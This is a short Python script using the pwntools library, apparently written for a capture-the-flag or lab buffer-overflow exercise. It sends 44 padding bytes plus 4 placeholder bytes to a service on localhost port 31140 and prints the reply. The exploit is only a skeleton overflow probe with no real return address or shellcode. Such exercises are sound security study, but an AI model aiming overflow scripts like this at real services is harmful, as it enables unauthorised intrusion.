from pwn import *

def exploit(target):
    payload = b'A' * 44
    payload += b'B' * 4 

    target.sendline(payload)
    try:
        print(target.recvall(timeout=5).decode())
    except Exception as e:
        print(f"Error receiving: {e}")

# Remote
print("Connecting to remote...")
try:
    r = remote('localhost', 31140)
    exploit(r)
except Exception as e:
    print(f"Failed to connect: {e}")
